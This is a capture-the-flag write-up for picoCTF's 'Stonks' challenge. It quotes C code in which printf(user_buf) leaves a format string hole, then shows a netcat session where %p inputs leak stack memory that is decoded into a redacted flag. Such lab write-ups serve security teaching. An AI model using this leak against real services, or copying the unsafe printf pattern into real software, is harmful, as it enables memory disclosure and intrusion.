# Challenge: [Stonks](https://play.picoctf.org/practice/challenge/105)
20 Points
# Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! 
# Solution
To start with, I read the provided file [vuln.c](./vuln.c) and find something could be exploited:

```python
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```
This has a format string vulnerability, author used printf(user_buf) but didn't determine kind of output formats. Due to *user_buf* is variable I enter, I could exploit the programe by using it, just read the result of fgets().

```sh
──(kali㉿kali)-[~/picoCTF/Stonks]
└─$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p%p%p%p
Buying stonks with token:
0x9db84900x804b0000x80489c30xf7f7ed800xffffffff0x1
Portfolio as of Fri Jan 27 16:46:25 UTC 2023


2 shares of Y
2 shares of LL
10 shares of WZC
4 shares of OPF
2 shares of Y
19 shares of TR
6 shares of VM
91 shares of LNOL
66 shares of KHS
18 shares of PQ
70 shares of W
261 shares of QG
412 shares of X
Goodbye!

```

Actually, I don't know how many '%p' need to import so I try a long string about 30 %p. 

The hex string I receive displayed in Litte Endian, therefore, I should convert it to Big Endian to get the flag.

I write a script to send my request and decode the flag [solve.py](./solve.py)

The flag is: picoCTF{*********************}